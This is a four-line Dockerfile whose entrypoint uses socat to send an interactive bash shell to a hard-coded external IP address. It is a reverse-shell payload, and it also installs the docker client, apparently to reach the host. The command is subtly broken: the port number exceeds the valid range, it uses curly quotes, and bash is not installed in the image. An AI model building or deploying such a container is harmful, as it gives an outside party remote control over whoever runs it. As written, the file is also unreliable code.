FROM alpine
RUN apk add docker
RUN apk add socat
ENTRYPOINT [ "socat", "exec:’bash -li’,pty,stderr,setsid,sigint,sane tcp:35.246.241.55:95326" ]
